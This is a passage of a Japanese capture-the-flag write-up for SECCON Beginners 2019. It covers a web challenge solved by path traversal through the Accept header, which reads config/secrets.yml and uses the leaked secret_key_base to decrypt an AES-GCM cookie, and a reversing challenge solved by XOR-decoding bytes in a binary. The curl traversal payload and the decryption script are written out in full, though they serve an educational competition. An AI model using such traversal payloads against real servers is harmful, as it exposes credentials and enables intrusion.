  def index
  end

  def show
    serial_code = params[:serial_code]
    msg_encryptor = ::ActiveSupport::MessageEncryptor.new(Rails.application.secrets[:secret_key_base][0..31], cipher: "aes-256-gcm")
    @coupon_id = msg_encryptor.encrypt_and_sign(serial_code)
  end
end
```

`secret_key_base` の先頭 32 バイトを鍵として、`aes-256-gcm` で暗号化しているようです。`secret_key_base` を得られないか、`config/secrets.yml` を読んでみましょう。

```
$ curl https://(省略)/storelists -H 'Accept: ../../../config/secrets.yml{% raw %}{{{% endraw %}'
# Be sure to restart your server when you modify this file.

# Your secret key is used for verifying the integrity of signed cookies.
# If you change this key, all old signed cookies will become invalid!

# Make sure the secret is at least 30 characters and all random,
# no regular words or you'll be exposed to dictionary attacks.
# You can use `rake secret` to generate a secure secret key.

# Make sure the secrets in this file are kept private
# if you're sharing your code publicly.

# Do not keep production secrets in the repository,
# instead read values from the environment.
production:
  secret_key_base: 4e78e9e627139829910a03eedc8b24555fabef034a8f1db7443f69c4d4a1dbee7673687a2bf62d7891aa38d39741395b855ced25200f046c280bb039ce53de34
```

`secret_key_base` が得られました。

`/flag` にアクセスしたときに表示された文字列を Python と [PyCryptodome](https://pycryptodome.readthedocs.io/en/latest/) を使って復号しましょう。

```python
from base64 import b64decode
from Crypto.Cipher import AES # https://pycryptodome.readthedocs.io/en/latest/

encrypted, nonce, tag = 'bQIDwzfjtZdvWLH+HD5jhhZW4917cFKbx7LDRPzsL3JXqQ8VJp5RYfKIw5xqe/xhLg==--cUS9fQetfBC8wsV7--E8vQbRF4vHovYlPFvH3UnQ=='.split('--') # とりあえず -- で区切る
encrypted, nonce, tag = b64decode(encrypted), b64decode(nonce), b64decode(tag) # Base64 っぽいのでデコード
key = b'4e78e9e627139829910a03eedc8b24555fabef034a8f1db7443f69c4d4a1dbee7673687a2bf62d7891aa38d39741395b855ced25200f046c280bb039ce53de34'[:32]

# GCM モードで復号、
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
plaintext = cipher.decrypt_and_verify(encrypted, tag)
print(plaintext)
```

```
$ python3 solve.py
b'\x04\x08I",ctf4b{06a46a95f2078ae095470992cd02f419}\x06:\x06ET'
```

フラグが得られました。

```
ctf4b{06a46a95f2078ae095470992cd02f419}
```

## Reversing
### SecconPass (425)
> パスワード管理アプリケーションを解析してフラグを手に入れよう
> 
> 添付ファイル: 52de9ec78b843e17a1fce6733d38d5ef_secconpass

与えられたファイルがどのようなものか、`file` コマンドで確かめてみましょう。

```
$ file 52de9ec78b843e17a1fce6733d38d5ef_secconpass
52de9ec78b843e17a1fce6733d38d5ef_secconpass: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=86f0b4e1564f87a2fc9929127159c6a574bcb661, not stripped
```

x86_64 の ELF ファイルのようです。このバイナリに怪しげな文字列が含まれていないか (具体的にはフラグがないか)、バイナリエディタで開いてフラグフォーマットの `ctf4b` を検索してみましょう。

```
000039E0: 49 44 3A 20 00 20 50 41 53 53 3A 20 00 00 00 00     ID: . PASS: ....
000039F0: 54 4D 51 0D 55 42 7E 54 47 55 04 54 04 57 43 0A     TMQ.UB~TGU.T.WC.
00003A00: 53 66 75 40 68 7A 47 08 42 0C 47 08 42 0C 6D 00     Sfu@hzG.B.G.B.m.
00003A10: 63 74 66 34 62 00 72 62 00 2F 64 65 76 2F 75 72     ctf4b.rb./dev/ur
00003A20: 61 6E 64 6F 6D 00 45 72 72 6F 72 20 6F 70 65 6E     andom.Error open
00003A30: 20 2F 64 65 76 2F 75 72 61 6E 64 6F 6D 00 00 00      /dev/urandom...
```

`/dev/urandom` や `Error open /dev/urandom` のような普通の文字列に紛れて、`ctf4b` の前に怪しげな 32 バイトのバイト列があります。暗号化されたフラグでないか、いろいろ試してみましょう。取り出して `ctf4b{` と xor してみます。

```
$ python2
︙
>>> from pwn import * # https://github.com/Gallopsled/pwntools
>>> s = "54 4D 51 0D 55 42 7E 54 47 55 04 54 04 57 43 0A 53 66 75 40 68 7A 47 08 42 0C 47 08 42 0C 6D 00".replace(' ', '').decode('hex')
>>> xor(s, 'ctf4b{')
'797979\x1d !af/g#%>1\x1d\x164\x0eN%s!x!< w\x0et'
```

`79` という文字列と xor していそうです。このバイト列と `79` を xor してみましょう。

```
>>> xor(s, '79')
'ctf4b{Impl3m3nt3d_By_Cp1u5p1u5Z9'
```

フラグっぽい文字列が出てきましたが、`ctf4b{Impl3m3nt3d_By_Cp1u5p1u5Z9}` や `ctf4b{Impl3m3nt3d_By_Cp1u5p1u5Z}` を提出しても通りません。`Z9` を`!}` に置換すると通りました。

```
ctf4b{Impl3m3nt3d_By_Cp1u5p1u5!}
```

---

<blockquote class="twitter-tweet" data-lang="ja"><p lang="ja" dir="ltr">問題 secconpass は不具合によりフラグの一部を正常に得ることができないため、提出されたフラグの先頭 30 文字が正しければ、正解とします。フラグを一度送信しているものの正答とならなかった場合には、再度送信してください。ご迷惑をおかけしてしまい申し訳ございません。 <a href="https://twitter.com/hashtag/ctf4b?src=hash&amp;ref_src=twsrc%5Etfw">#ctf4b</a> <a href="https://twitter.com/hashtag/seccon?src=hash&amp;ref_src=twsrc%5Etfw">#seccon</a></p>&mdash; SECCON Beginners (@ctf4b) <a href="https://twitter.com/ctf4b/status/1132364002246373376?ref_src=twsrc%5Etfw">2019年5月25日</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

とのことでした。エスパーだけで通してしまった…。